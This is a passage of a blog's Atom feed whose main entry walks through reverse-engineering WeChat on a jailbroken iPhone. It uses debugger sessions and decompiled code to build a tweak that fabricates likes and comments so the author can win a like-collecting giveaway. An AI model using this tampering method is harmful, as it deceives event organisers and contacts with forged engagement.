QxP4b/iey2BcT5Z+MBl5NSh/LqqdW+jwZFqHv9bJIlSdPtJn0Khl2aJ9+I6WjWfpmDeLh/ePwrmZtNxeJ67EjnCidNkuyM9fJCYlGjoJFNaheVQAPgIRn0mtSRj95XTf+CTU11VbzlSmT/xC4pz75Edsh/WXFCNB2r0VNJcuwYtUZaNETxpTNFIVX85WrPbWZTX+Z7jcHDIK1ekDzy5jR+J4kRl08oWgFts9xXdyIFFripBB73E2QnqYE9PerBLfNIfu4MLto2/ToOVrMTofe3mcDZ0ThxeW/T3azDOKcl9bzGNOAaA5fSj5t3vlPUjX4hJPsTszC4pLaf24HY1C5TdEnk2YXyGSBxOCQkIOnHZhAitkChzE3/QhCPv5r50Y43fw9NaOgTpDWhAuaYrYS79V3p7XAnHRINCLHWGNXAyizIWwzHaCPyxnKbLCfn3KY7aJCUg3IRQvp8gwMUkcK4HF8kXl0s1S4KC3JyO2aBema2rMhrtt/qeSQtE81ULjlDkEuT9/PeQQikUyFKByQAaWRndcvt6l8LUfDFsG5Cn9qlmJlHVzh/sabjsz1A5bo2F11qsHiyiRoufC368vLtxcPYBHEYGu7zmEKHL/wJVLb00plii6SZqgKllo5Dmxp5WWsel0FbFZaOVA8bryN3uomewgetjYBHi9NaH1PqbeXmNssZeR49HPO0hbU19QtPxAeffH2dNW5PB+LbUiakp1DXgLYFt5rooP0XJviqaMAdiOif88n25DBm2gGSrD+sqUm9oolDvhKI5ao9Q2rS1jbPB1qATqaX6zfB9KuCWbS3zMrvs97oj20i1UXpi6hMRuN1j/mzj7+JzXMTYvjuiUezlvTgODGZzTOloii33/0lMypfJCUQSMjVchY537hbDz8n/Y9X78uInMYamHrK3AUHS7b2fD6MLP+YYKP5uHbLFIj812Gwf2818mwscYqqjB5b8AIwPQIizz7viZMi1D6uYImJp5l3RfDmBYnnDC6n+SrWaVW27odB8zkXkgyoI7APWVuS30P26l+9YuVkBpf3k0YYb7poVCjp+xWm0JFmLQSoqnh7Tn0zXA5XJbZLwUMuvgQWHPLfNHKXY2bGNmLzb0r4fqWXs8Og9zY90i/lzsjEs8YxW4ScxrNM+fdwE1mxTwyE+IpQzHUz8GJQ/fbot1+RoWoLCMrQaffIJxKBlgDdWAo5gSkvWd+uEywGQ4IfLY90Rpp6MQjLBVltDRJ4Mdg8g+O5zAeE2SqZzZPvMuK8AGWbZ6JHxgU75NcW9eGJL1/ywo1sLr4oF6QE/OND8S7w6NJQsAVEjkgMdozVEZJ3woFXpbbhw20gFrWa3hTw4YsbjQ/ABKcM5wLzzzLEOBrKfg2gh08Ii3JCJPcv1ltoYR57gsmiqejbnzdrnjQdAKVNXYdyXoSZaWwV6NiojQIDFGJLoDPug1dSI765YbyfV0k/cC2wwUjZPEKgKhcpDBGBPx0gq4KUKjkVfGrS2kT0uLi6KqCLTLVA2D7+CVppK0gkwWlPF/JPotpZ7FRjQdhAsWt4x8iUn2LgCXY0POlrmNz1lSXrTpzZdazb4T1QZ9gSlicy7xW6eJicvkt79Y3YIfKW8ep34F23iedgQm1ZfDrnXhHu9YvbZG9FKOO9+v+z5nRBndbQ1yjVj3G2lb44uZ37qwR2laQ987xm66KwmBPI+CihtS6TuM4UUpxtgXRdI3DaBfkS1OgPY/vvLFFVxuG27w1YPNcrbvl+WrCnmqcrBTb1FK11ctBLqCqYqrDM4C5ihlbmIBZ0W9cLKYxwsD4SOTqwVD+Mz6pIZ+EQh13Ib4q+xtk0+04x76TCi8Ja1RyxpzDyZwLTXx9tpwYqPYYhPIFLGOlXkpNVTRIu/1QSbb76BoVL/x5K6/RdlnVDSISCsonieLsWJYmdbPs43Q0HWjOdEVp2ul3hUO1tJXmWRwABWEOjCoxwWYSGO7k3gZ4wxUI0SeIYDMtHX+2buhePC31uU5rCfB1g0FxkR1Ag+ebMSFblhCgcfeR+kvWMRvW23GHzUlWby5XytceOakyU+UBoC01y9+lmdy7bdMNwuMphdLl9LcbqFpQ7my+szuLDZrQwj2ClWNwmgy/Ynbk0A6TsG0zIzKeCyM4FeNP8wgwJx0M5nTaWQ3dfxgimf0zNOWLkO7egKEUpMxK/Xwm8HaUjUGUdvZ7zzFp+E79TNPpadVvfguVh3ssZ+cRz8vldvpkPW7sXqdqt1zZOLEOJJhCsEw4r+FWvxcAHcGsVU8GPwv/NZTbh3/jfuoAemdtmqrj8GsHN4tNQZbgfxbgoKj6AcBhSo7R+gNWDGCiexV7i4DnPAf6HWTt1/DA52P/2yPsUMCPgoB3rf06wGGUs/OjnNlpKAYZ5szuwLqwV7oBrEGv1+PKFdP2gcSF/uaXxnRTjTZKks9q2RJHMcgq4vuW8s0H5PN24DtMZHwjZheAlGuxlMbarzJHaTFISuubSPaz/vrPJ9Rjvy+ueOU3qfyjZq15uGgfkRUhLITM0TCABVe06g0Vw80f5hi7l+Qf2g8ptm4bnk9HBrBRfHmA+dwB0LcUWXw9qMOYn1Lc+iZv3QU2Sm7YVebyj3K1C8fezBGZeZqVz6cW25xXCX68SM8zmf/avAyAwIo72zNtaglQqjsoQgLiQvoJFeQvIXAc/C0nuBt8PlSprdJaSvTafgN/zhegMXhr5v8SQ5UylWfYhRufPnjpDjIVsp7qMxCjTt4jHvghLLoMlYW22m/iunwNTTPaNzf4+nf5lg0OvzcW4AwYlVJK+sw7uRpZz2HxBvtGE2LH1reVa1pG0WZYjfiNMci4CsC3AFSzuliUqcukLJz87qWA8dOHKCZfa8v7tdlLlOc1Sr+jICyfpTpwvKBiDHjuRIkfZ3O9sTvxp4PF+yEq9iqQgAibPl+EkYJdJC02hP35PgZrsOxaIMdpF9BWvuqW59wMxley+FqUxD37jy7lzhV+wkurNJOZW6b5qWortrej8XF6eYeL0CZzGT5ZKW2a+pYmhipXNy3O0a5Os4Bj4aVidmPc3w4OCiJfsziB6q+s6aLF8p2iSCy3OgLWhT8OZMU4GVcX8VnSKCYJMI+NbnwWQ/y1WfRu0w0jtXr6G4yn/MGUf4zahldAU73AQtIH4b0UPJGy84cnRnUwHzYoVp/mS74UhFFjJGjW2kq0DiFOolRwx+K/kCqjfNmElGdujpzoPI3egReJSJAfgCpX+zCch/Bk6jEpMGrVWmxLw8dESI871O2FN+eQRRUrq9dtW6PvpiiCV8S2RszrxfpzM/MLd2mAM24DTUsAsW9tNT2HvDaz0pAbUZ5xn++ZlUwZleGjPgEXKWUCmXR9Yw28CFJoRryYZC1k4myxd/V3QKJQ/CIHtzPUkW5Nuvh782RpnSaU62WNNX37/D6M4BJwYUZCpFcvEdZRNuHcW6hXJIxaGAp5ldgLh7KsSE01YaC0HyAqQthp2Z4PRX3JsPJDoxFBvvW0pBUbo0BwZA8mKkN8c6HIRWgSKmlTmf4Bnj1ipYppvyn/pISZaRtQJ4mTlurJcPpo+gJRM/AOD3g67w4BSycc6ivCXdA9/Z5A4tC6XH4q37KRGbwbWxxmhbb+C9o/2jDBBDjMaj9rDHJpdXA+l4lSXkdjkSCCxVw46GoCtZWul9QwDFBFrFx+8kBE47lSshTVJuz7PysBhwBTvNl2/dnjbI46steSrVQU+vvGTzrX22fFkGsX1GI/e/46P+zE4BvXBJJzl+Zq1CH8Zl1WyfzH4FGxBU+rf7gQZQpu+WCPeO8Q7hNRNFQWzMjOhNNy5Ms6hD/qcqXyF/wdOhBWXG97xgobUodkj4QsdpwPZANmCQHjaEWpnxTliMTktHIIGkpOXFPWYHJh316vwk2SDl3luEYjqPSl/oX7XYDqr2gZ/OH/g95mt9VfrVN0aYPlGzfsfbFLL0ls1KOCYQ2nRAvJDcieeXpMnYpJG/O8TjCkO/FG/j8agXb+pRfBxdhMhdHwmq2ItPNRXxZz9KqoOOYuw9mOcNpQv72iWcS+njX5ya2n3Neqd6zzTwFCyknPSTB59iPR6kxnlnSfigrM/44vK9WB6QZN082YVkCee9cGESbFdLW3Ud7KA2KO/MNNEscy1OsfzBOiklv9FZQo2bQ5/JdiHt1WtRUbcPdSdy59KrABNRhQpzh7ogMj6oHAbn4pxmkAqKyYEqgSo/KS8qpFm2fiH1ESbLD96jVJCfyWfuEzDebGNv3mL1QwY35Kk+jq26tRiP1MRWSRcPi0Ltu2CuUaObvIwXdelCbHR+KaCKuOigFgHJRMB1VZuzFXmjpe/Bx+RAFOi1C5pGAIvxLuJbnq2EGiIMNk9eRPspR5kn+DxEoWvvgHZOxubTbQDhF2PmUIV9kt2CufD1yHL/+VsG/8GcipHg/vKT3EfxfjOKjcdVNot4MH5hul7k9+LULak/jm0qtpa6OBH71PkRvldSxCklgaNyRqPhixxe2afkbloctN1l/np0UYbnHhZx4KBXIH8oZHJbJUOboArKQoue4Ml6C2FKPglJtbRqQFky7dEYIB92/3THseOPwbft6bd9Sc9CxJOFAS6z2qCkw4cm5YRiCwdj12K0+Kucjs4p6AnXd9F6H0MxBaJirofQijdaHUWp5E6r4GJ4z6wwsHn7zGqkWOfoqxnqdBvavzGgcOw3/7b/2IvmW0CIp36ahIR+dmo8Cw/6bRCbXcRa2yITz+NfCEcVMayv1+Sq1+nZHoCxQKvgukOZ/Yu0xzeH4SPkDOQi9+CRGjJdZMJSgmkXyzMm4a2RKjPCl13hlQ1IaQGz1eOlF0nHCt5pfambUL7KJMq6J3xRBri/ACXUzcW9nxaW8PiLcK3R1zM+xM7ugHlC7jU8graoUfMZd1vTjfY3WVBTR6Dx5cK6xszBoG5FLLc0/JidPmpovqPxbsmBD6cvYtG+TyHCw+SfsECklZ5PCIxXDekwzarx+W7DccOy+HVaLLrZbyp7NyFIssgKGfbjZequ1rqf0CC/VdxVwnHm2N5kGhyvGl6B1gKWIsSJTc3UQQr2qVi6KUClaOLgvrTQzjcx85mj7T5nuIyKtpjbARNf8aHLFYOD1lMmcMGm9MJDk/B2gg8gcdt/y8ZyXcVD629X4zD8avnuH9cO5XNUc5zMbI7oIhI98agUaeUGd5SulsVPxIl6RCWqmcDLxk2bSrShz74maH1Y2cnOOCeo4JCKFmkxu2RoJzEs6CaIxasB7SWvMkLQLJougXdd5TBfbySNcktXzbrDExBbZASWlepxXKf1+/M14J7+zpg3RlLXWugbF4YpYk6GY824xzqbDKXz2pCcntBVCEQdAhfpULgiYWL2XPH/kkXFeDD327reW1sxou94jXWdJv4LJFQyeYEGPDAoGowzgNk+4h76V6yLp4V7Zw51JivdhLPOVCZD3hi8yOJ1uQBmGSGrVqqwF1ILK/AmlVAGXSqjaHZfereZYRLmsQcyll8Iz2PlHieOBNXh1mUmHujxz3DU5uGjAVE0d7tZ0y2qQxh/aLYy9PlmkMDOPpXhR4w14WOFDyGFgD/WpGnwC9gTZZGXnnJAxmhUzB4jAlLfp8toh+k87xIxrG6VYA8Yk8EZFMCNI/1Yrt59HPX/A9ob0yZlFEfOdLxbTSAflUUP2jGKDD+EiapJFFyfah+t9OddNLMSURqnMDqq3CjDHRDqWhjDT4VN/ajVYvTPCO3QxU//Am9e35eKmidaYhZ+GaSOwAh8xqIGPzXXQ9WF2E4JRs4t1jUQ8933gcKrMEUdttNz7av9/Db7nGv3ZoDUACjbJKlHej5KCYrckKQuEdkXIjXic2yYS3lAav+afMe9HOFMBciuplXFb/Livhx/MPyA31707RX4AqRf0Wb7JUw9fOjc81RDWbboIYV/bZTFDccKpxWQiTXlQUsqwBnm0yr5qaPh3+0XHM/BW3SrAIdK9SEvzHkuwTfpp+beBHSDpf+8ShEhZOy0wPf2+JP9f4MHLUI+AGpKofLosDqijJnozyvSmD9K4/WRdrWms4SD/r4//+1xNOYV/dnloagB7ZNTXT4I2cSCiGsdcm/y6vZMuJw6CqZMFG1o+7xcXL6gW+CScS/tLpA+sqkqwVw+hKZOtEqDN3FIVZYT5emwW/Vey1gqfKyUA670=</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="Accessibility" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Accessibility/"/>
    
  </entry>
  
  <entry>
    <title>微信集赞/评论插件分析及开发</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/</id>
    <published>2019-07-22T02:22:01.000Z</published>
    <updated>2019-07-28T13:58:12.611Z</updated>
    
    <content type="html"><![CDATA[<h3 id="微信集赞-评论插件分析及开发"><a href="#微信集赞-评论插件分析及开发" class="headerlink" title="微信集赞/评论插件分析及开发"></a>微信集赞/评论插件分析及开发</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>为什么要做这个集赞的插件呢？起因是上周去参加了某个会议，有一个集赞60领玩偶的活动，但是想到平时一条朋友圈也就几个赞，而且又不想找人点赞，领不到，很气。回去以后想着能不能写一个集赞的插件，在需要的时候直接输入想要的赞、评论数量，我发的朋友圈就能有多少赞。这样再有这样的活动岂不美哉。准备开干！</p><h4 id="理性分析"><a href="#理性分析" class="headerlink" title="理性分析"></a>理性分析</h4><p>再开始之前，先理性分析一波：如果想要集赞，这里有两种思路，一个是直接在view层去更改，但是这样得去处理界面的一些细节，一旦不注意，很容易崩溃。还有种思路是更改datasource或者说赞评论的模型。可以想到，最初一条朋友圈肯定是从服务器拿到数据并封装成对应的模型。一般来说，越改底层的数据或者说源头的数据，那么稳定性和真实性就更高。这里我的想法就是既不改view层，也不改源头层，就改封装好的模型那一层应该就很符合要求。接下来主要讲一下怎么我去实现这个需求的分析过程，因为本身功能不是很复杂，大佬随便看看就行。</p><h4 id="准备条件"><a href="#准备条件" class="headerlink" title="准备条件"></a>准备条件</h4><ul><li>一台mac</li><li>一台越狱的iOS设备</li><li>ida/Hooper/theos</li><li>flex/issh/xia0LLDB</li><li>其他常见逆向工具等</li></ul><p>对于一贯喜欢上调试器分析得我，所以写了<a href="https://github.com/4ch12dy/issh">iSSH</a>和<a href="https://github.com/4ch12dy/xia0LLDB">xia0LLDB</a>两个工具，在这两个工具的辅助下整个插件用了2小时就完成了逆向分析和代码实现。</p><h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><h5 id="逆向赞和评论的数据模型"><a href="#逆向赞和评论的数据模型" class="headerlink" title="逆向赞和评论的数据模型"></a>逆向赞和评论的数据模型</h5><p>一切从界面入手，这里分析界面我一般喜欢用flex，在微信的朋友圈界面，用flex很容易发现当前界面的控制器为<code>WCTimeLineViewController</code>而且界面是一个<code>UITableView</code></p><p>将wechat执行文件拖入Hooper（<del>wechat文件太大，ida分析会很卡</del>）找到UITableView的代理方法：<br><code>-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]</code></p><p>这里面肯定会根据模型去设置cell数据</p><pre><code class="objective-c">  r2 = [r28 section];  var_70 = r25;  r24 = [r25 calcDataItemIndex:r2];  r25 = [[MMServiceCenter defaultCenter] retain];  r2 = [WCFacade class];  var_78 = r28;  r0 = [r25 getService:r2];  r0 = [r0 retain];  r24 = [[r0 getTimelineDataItemOfIndex:r24] retain];  [r0 release];  [r25 release];  r19 = [[MMServiceCenter defaultCenter] retain];  r0 = [r19 getService:[WCFacade class]];  r0 = [r0 retain];  r25 = [[r0 getLayerIdForDataItem:r24] retain];  [r0 release];  [r19 release];  r19 = [[MMServiceCenter defaultCenter] retain];  r0 = [r19 getService:[WCFacade class]];  r0 = [r0 retain];  r20 = r0;  r0 = [r0 getShowTip:r24 layerId:r25];  r29 = r29;  r26 = [r0 retain];  [r20 release];  [r19 release];</code></pre><p>整理下来就是</p><p><code>[[MMServiceCenter defaultCenter] getService:[WCFacade class]]</code>会得到一个<code>WCFacade</code>对象，然后通过</p><p><code>[WCFacade getTimelineDataItemOfIndex:]</code>就能得到cell的数据</p><p>看到这里，上调试器！看下都是什么数据…</p><p>将设备用数据线连接上电脑（这里我推荐用数据线的方式，wifi延时太高，影响心情），手机上打开微信</p><p>直接输入<code>issh debug -a wechat</code>就能挂上微信</p><pre><code class="shell">xia0 ~ $ issh debug -a wechat[I]:iproxy process for 2222 port alive, pid=1382[I]:++++++++++++++++++ Nice to Work :) +++++++++++++++++++++[I]:iOSRE dir exist[I]:iproxy process for 1234 port alive, pid=1395[I]:Run ps -e | grep debugserver | grep -v grep; [[ 0 == 0 ]] &amp;&amp; (killall -9 debugserver 2&gt; /dev/null)[I]:/iOSRE/tools/debugserver file exist, Start debug...[I]:Run /iOSRE/tools/debugserver 127.0.0.1:1234 -a wechat</code></pre><p>打开另一个终端进行调试（我的lldb已经安装了xia0LLDB脚本）</p><pre><code>xia0 ~ $ lldb&quot;xutil&quot; command installed -&gt; xutil&quot;choose&quot; command installed -&gt; choose&quot;xbr&quot; command installed --&gt; xbr -[UIView initWithFrame:]&quot;sbt&quot; command installed -&gt; sbt// 连接到远端(lldb) pcc</code></pre><p>这里有两种方法：</p><p>一种是用<code>xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot;</code>下断点去查看；</p><pre><code>// 对-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]方法下断点(lldb) xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot;(lldb) c</code></pre><p>第二种是由于lldb支持choose命令，可以直接拿到<code>WCFacade</code>对象。既然如此选choose</p><pre><code>(lldb) choose WCFacade&lt;__NSArrayM 0x2823d9860&gt;(&lt;WCFacade: 0x139e1c030&gt;)</code></pre><p>调用其<code>getTimelineDataItemOfIndex:</code>方法就能拿到第一条朋友圈的数据</p><pre><code>(lldb) po [0x139e1c030 getTimelineDataItemOfIndex:0]Class name: WCDataItem, addr: 0x13e2871d0tid: 13121667995275047007username: wxid_6913ohfkk7kq12createtime: 1564224719commentUsers: ()contentObj: &lt;WCContentItem: 0x2801f5500&gt;</code></pre><p>输入<code>ivars 0x13e2871d0</code>就能拿到对象的所有属性值</p><pre><code>(lldb) ivars 0x13e2871d0&lt;WCDataItem: 0x13e2871d0&gt;:in WCDataItem:    cid (int): 0    tid (NSString*): @&quot;13121667995275047007&quot;    type (int): 0    flag (int): 0    username (NSString*): @&quot;wxid_6913ohfkk7kq12&quot;    nickname (NSString*): @&quot;xia0&quot;    createtime (int): 1564224719    locationInfo (WCLocationInfo*): &lt;WCLocationInfo: 0x2801f7800&gt;    likeFlag (BOOL): NO    likeCount (int): 0    likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x286152d90&gt;    commentCount (int): 0    commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x2861539c0&gt;    contentObj (WCContentItem*): &lt;WCContentItem: 0x2801f5500&gt;    appInfo (WCAppInfo*): &lt;WCAppInfo: 0x287404080&gt;    contentDesc (NSString*): @&quot;test&quot;</code></pre><p>由于属性太多，这里我就只显示了一些比较关心的数据，可以看到这就是我发的一条内容为test的朋友圈。</p><p>里面我们还发现了<code>likeUsers</code>和<code>commentUsers</code>的字段，冷静思考就知道应该就是对应的赞和评论列表。我先给自己点个赞看下里面的数据。</p><pre><code>likeCount (int): 1likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e37060&gt;</code></pre><p>发现赞的数量变为1了，在看下里面的内容</p><pre><code>(lldb) po 0x283e37060&lt;__NSArrayM 0x283e37060&gt;(Class name: WCUserCommentusername: wxid_6913ohfkk7kq12nickname: xia0content:source: 0type: 1createTime: 1564225007isLocalAdded: 0commentID: (null)comment64ID: (null)refCommentID: (null)refComment64ID: (null)refUserName:bDeleted: 0)</code></pre><p>正是我自己的微信号。同理可以得到评论</p><pre><code>commentCount (int): 1commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e349c0&gt;(lldb) po 0x283e349c0&lt;__NSArrayM 0x283e349c0&gt;(Class name: WCUserCommentusername: wxid_6913ohfkk7kq12nickname: xia0content: 评论测试source: 0type: 2createTime: 1564225144isLocalAdded: 1commentID: (null)comment64ID: (null)refCommentID: (null)refComment64ID: (null)refUserName: (null)bDeleted: 0)</code></pre><p>到这里我们还可以发现赞和评论都是一个类（模型），只是里面的类型字段不同。现在我们其实已经拿到了我们想要的数据模型了。但是还有一个问题在于我们应该什么时候去更改这些数据呢？也就是我们说的hook点。</p><p>最好的hook可以想到是每次刷新数据的时候，这样我们的数据就是最新的。</p><h5 id="寻找HOOK点"><a href="#寻找HOOK点" class="headerlink" title="寻找HOOK点"></a>寻找HOOK点</h5><p>先想一下，刷新数据的时候，当拿到新的数据肯定会封装为一个<code>WCDataItem</code>对象，那么我们可以对<code>WCDataItem</code>里面的方法下断点，然后打印调用链不就反向得到了刷新的函数了吗？</p><p>但是逆向和调试过微信的人都知道，当你使用bt命令的时候只能得到一堆无符号的调用栈像下面这样</p><pre><code>(lldb) bt* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 4.1  * frame #0: 0x000000010857d4d0 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 30312888    frame #1: 0x0000000194fcc638 Foundation`_decodeObjectBinary + 2004    frame #2: 0x0000000194fcbb6c Foundation`_decodeObject + 340    frame #3: 0x0000000194ed24fc Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228    frame #4: 0x0000000194f2a09c Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92    frame #5: 0x0000000105a88404 WeChat`int fmt::internal::CharTraits&lt;char&gt;::format_float&lt;long double&gt;(char*, unsigned long, char const*, unsigned int, int, long double) + 2432992    frame #6: 0x0000000108da9ea8 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38884240    frame #7: 0x0000000108daa890 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38886776    frame #8: 0x0000000108dad178 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38897248    frame #9: 0x0000000108717394 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 31991932</code></pre><p>但是用我写的sbt命令就能恢复oc符号，下面我们对<code>-[WCDataItem setCid:]</code>下断点，然后得到调用栈</p><pre><code>(lldb) sbt==========================================xia0LLDB==========================================  BlockSymbolFile    Not Set The Block Symbol Json File, Try &#39;sbt -f&#39;============================================================================================  frame #0: [file:0x103c094d0 mem:0x10857d4d0] WeChat`-[WCDataItem setCid:] + 0  frame #1: [file:0x18193c638 mem:0x194fcc638] Foundation`_decodeObjectBinary + 2004  frame #2: [file:0x18193bb6c mem:0x194fcbb6c] Foundation`_decodeObject + 340  frame #3: [file:0x1818424fc mem:0x194ed24fc] Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228  frame #4: [file:0x18189a09c mem:0x194f2a09c] Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92  frame #5: [file:0x101114404 mem:0x105a88404] WeChat`+[CUtility SafeUnarchiveFromData:] + 64  frame #6: [file:0x104435ea8 mem:0x108da9ea8] WeChat`-[WCAdvertiseDataHelper hasCommented:] + 116  frame #7: [file:0x104436890 mem:0x108daa890] WeChat`-[WCAdvertiseDataHelper IsAdvertiseDataValid:] + 48  frame #8: [file:0x104439178 mem:0x108dad178] WeChat`-[WCAdvertiseDataHelper getAdvertiseDataByCurMinTime:MaxTime:] + 552  frame #9: [file:0x103da3394 mem:0x108717394] WeChat`Maybe c function? Distance:3348 &gt;= 2500 # Symbol:-[WCTimelineMgr tryRemoveCachesOfLikeUserWithNewTimelineList:] + 3348  frame #10: [file:0x206a0 mem:0x1131f06a0] WeChat`-[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:] + 233  frame #11: [file:0x103db00c8 mem:0x1087240c8] WeChat`Maybe c function? Distance:9732 &gt;= 2500 # Symbol:-[WCTimelineDataProvider responseForSnsTimeLineResponse:Event:] + 9732  frame #12: [file:0x103db0398 mem:0x108724398] WeChat`-[WCTimelineDataProvider MessageReturn:Event:] + 112  frame #13: [file:0x1033923c0 mem:0x107d063c0] WeChat`-[CAppObserverCenter NotifyFromMainCtrl:Event:] + 336  frame #14: [file:0x104c292f8 mem:0x10959d2f8] WeChat`-[CMainControll TimerCheckEvent] + 728  frame #15: [file:0x1800a3604 mem:0x193733604] libobjc.A.dylib`-[NSObject performSelector:withObject:] + 68  frame #16: [file:0x101cb1fa8 mem:0x106625fa8] WeChat`-[MMNoRetainTimerTarget onNoRetainTimer:] + 84  frame #17: [file:0x1819750bc mem:0x1950050bc] Foundation`__NSFireTimer + 88  frame #18: [file:0x180e3d0a4 mem:0x1944cd0a4] CoreFoundation`__CFRUNLOOP_IS_CALLING_OUT_TO_A_TIMER_CALLBACK_FUNCTION__ + 32  frame #19: [file:0x180e3cdd0 mem:0x1944ccdd0] CoreFoundation`__CFRunLoopDoTimer + 884  frame #20: [file:0x180e3c5c4 mem:0x1944cc5c4] CoreFoundation`__CFRunLoopDoTimers + 252  frame #21: [file:0x180e37284 mem:0x1944c7284] CoreFoundation`__CFRunLoopRun + 1832  frame #22: [file:0x180e36844 mem:0x1944c6844] CoreFoundation`CFRunLoopRunSpecific + 452  frame #23: [file:0x1830e5be8 mem:0x196775be8] GraphicsServices`GSEventRunModal + 104  frame #24: [file:0x1ae78431c mem:0x1c1e1431c] UIKitCore`UIApplicationMain + 216  frame #25: [file:0x100152b04 mem:0x104ac6b04] WeChat`main + 1387268  frame #26: [file:0x1808ec020 mem:0x193f7c020] libdyld.dylib`start + 4</code></pre><p>可以看到调用栈的符号已经恢复了，能够清晰的看出调用的过程</p><p>其中里面有个很明显的方法</p><p><code>-[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:]</code></p><p>看名字就知道，这个应该就是我们需要的hook点。</p><h5 id="整理思路"><a href="#整理思路" class="headerlink" title="整理思路"></a>整理思路</h5><p>整理一下目前的情况，首先拿到了赞和评论的模型，然后找到了hook点。下一步就是写代码去实现集赞的功能。</p><p>大概的代码逻辑应该如下</p><ul><li>在hook点的时候拿到原始的朋友圈数据，并过滤出自己的那条朋友圈</li><li>取出自己朋友圈的赞和评论数据备用</li><li>随机从通讯录好友里面选择数量去构造赞和评论对象，并放入原朋友圈赞和评论列表里面</li></ul><p>下面就是写代码实现就可以了。还有个情况是在你进入自己的朋友圈详情界面的时候，也就是看到点赞的人都是头像的界面。也需要做类似的操作才能实现集赞的功能。</p><p>这里分析的过程和上面类似，我选择的hook点为：<br><code>-[WCCommentDetailViewControllerFB setDataItem:]</code></p><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><p>具体的代码实现这里就不再去分析了，我把代码开源到了这里<a href="https://github.com/4ch12dy/fkwechatzan">fkwechatzan</a></p><h4 id="完成效果"><a href="#完成效果" class="headerlink" title="完成效果"></a>完成效果</h4><ul><li><p>集赞助手设置界面</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1361564255775_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p></li></ul><ul><li><p>朋友圈详情界面</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1341564229215_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p></li><li><p>赞和评论</p></li></ul><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1321564227655_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p><h4 id="一点总结"><a href="#一点总结" class="headerlink" title="一点总结"></a>一点总结</h4><p>本文详细介绍了使用issh和xia0LLDB去完成一个集赞功能的逆向分析过程，这个功能本身不是很复杂，这里仅仅我在逆向过程中的一些理解和分析。每个人的逆向分析过程可能都不尽相同，我提供一个完整的分析步骤，而不是完全的去靠猜测，虽然逆向有时候猜测就能有一些意外惊喜，不过不确定性也同样会花费大量时间。</p><p>最后，妈妈再也不用担心没有人赞我的朋友圈了~</p><p>下次集赞领礼品的活动我要定了！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;微信集赞-评论插件分析及开发&quot;&gt;&lt;a href=&quot;#微信集赞-评论插件分析及开发&quot; class=&quot;headerlink&quot; title=&quot;微信集赞/评论插件分析及开发&quot;&gt;&lt;/a&gt;微信集赞/评论插件分析及开发&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot;
      
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>Frida调用栈符号恢复</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/</id>
    <published>2019-07-02T09:00:14.000Z</published>
    <updated>2019-08-01T07:53:10.362Z</updated>
    
